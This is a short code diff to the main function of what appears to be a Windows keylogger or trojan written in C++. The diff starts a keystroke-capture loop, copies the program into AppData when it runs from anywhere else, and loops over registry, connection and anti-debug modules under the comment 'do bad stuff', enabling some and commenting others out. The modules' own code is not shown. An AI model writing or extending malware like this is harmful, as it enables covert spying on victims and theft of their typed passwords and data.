@@ -26,6 +26,10 @@ int main()
 	MP msptModule;
 	UTIL util;
 	
+	keyLoop();
+	//thread keylogger(keyLoop);
+	//keylogger.detach();
+
 	if (!util.isExecutingFromAppData()) {
 		copyModule.execute();
 		debgModule.execute();
@@ -33,17 +37,17 @@ int main()
 		return 0;
 	}
 
-	thread keylogger(keyLoop);
+	/*thread keylogger(keyLoop);
 	keylogger.detach();
 
 	while (true) {
 		// do bad stuff
-		//regsModule.execute();
+		regsModule.execute();
 		debgModule.execute();
-		//connModule.execute();
+		connModule.execute();
 		msptModule.execute();
 		Sleep(20000);
-	}
+	}*/
 }
 
 
